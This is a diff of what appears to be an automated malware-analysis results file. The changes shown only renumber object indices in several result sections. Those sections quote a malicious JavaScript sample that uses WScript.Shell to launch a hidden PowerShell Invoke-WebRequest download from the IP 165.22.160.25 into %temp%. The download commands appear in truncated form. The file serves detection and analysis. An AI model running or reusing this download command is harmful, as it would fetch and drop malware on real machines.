@@ -52,7 +52,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[13]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -74,7 +74,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[13].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[17](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -96,7 +96,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[13].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[17](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -118,7 +118,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[13].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[17](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -140,7 +140,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[13].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
